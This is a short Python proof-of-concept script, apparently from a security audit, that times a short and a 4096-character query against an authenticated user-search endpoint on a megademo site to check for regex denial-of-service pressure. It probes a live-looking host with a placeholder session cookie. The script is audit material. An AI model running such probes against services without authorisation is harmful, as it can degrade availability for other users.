#!/usr/bin/env python3
"""Compare short and very long authenticated user-search queries for ReDoS-style pressure."""
import os
import sys
import time

import requests

BASE_URL = os.environ.get('MEGADEMO_BASE_URL', 'https://megademo.ai')
DEFAULT_COOKIE = 'connect.sid=YOUR_SESSION_COOKIE_HERE'
COOKIE = os.environ.get('MEGADEMO_COOKIE', DEFAULT_COOKIE)


def probe(session, query):
    start = time.perf_counter()
    response = session.get(f'{BASE_URL}/api/users/search', params={'q': query}, timeout=20)
    elapsed = time.perf_counter() - start
    return response, elapsed


def main():
    session = requests.Session()
    session.headers.update({'User-Agent': 'megademo-security-audit-poc/1.0', 'Cookie': COOKIE})

    short_response, short_elapsed = probe(session, 'al')
    long_query = 'A' * int(os.environ.get('MEGADEMO_LONG_QUERY_LEN', '4096'))
    long_response, long_elapsed = probe(session, long_query)

    print(f'short query status={short_response.status_code} elapsed={short_elapsed:.3f}s bytes={len(short_response.text)}')
    print(f'long query length={len(long_query)} status={long_response.status_code} elapsed={long_elapsed:.3f}s bytes={len(long_response.text)}')

    if short_response.status_code == 200 and long_response.status_code == 200:
        print()
        print('SUPPORTING SIGNAL: the endpoint accepted and processed a very long authenticated regex-search query.')
        return 0

    print()
    print('NOT CONFIRMED: the endpoint did not process both baseline and long queries successfully.')
    return 1


if __name__ == '__main__':
    sys.exit(main())
